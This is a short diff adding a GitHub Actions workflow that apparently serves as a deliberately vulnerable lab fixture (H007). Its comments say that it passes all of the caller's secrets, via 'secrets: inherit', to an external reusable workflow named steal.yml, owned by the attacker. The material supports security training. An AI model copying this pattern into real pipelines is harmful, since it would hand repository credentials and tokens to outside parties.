@@ -1,0 +1,12 @@
+# LAB VICTIM (H007) — secrets: inherit to an EXTERNAL reusable workflow the attacker
+# owns. river-build/lab-reusable-H007-secrets-inherit is filled in at provision time. `secrets: inherit` hands
+# ALL of the caller's secrets to that attacker-controlled workflow.
+name: Lab Caller
+
+on:
+  workflow_dispatch:
+
+jobs:
+  call:
+    uses: river-build/lab-reusable-H007-secrets-inherit/.github/workflows/steal.yml@main
+    secrets: inherit
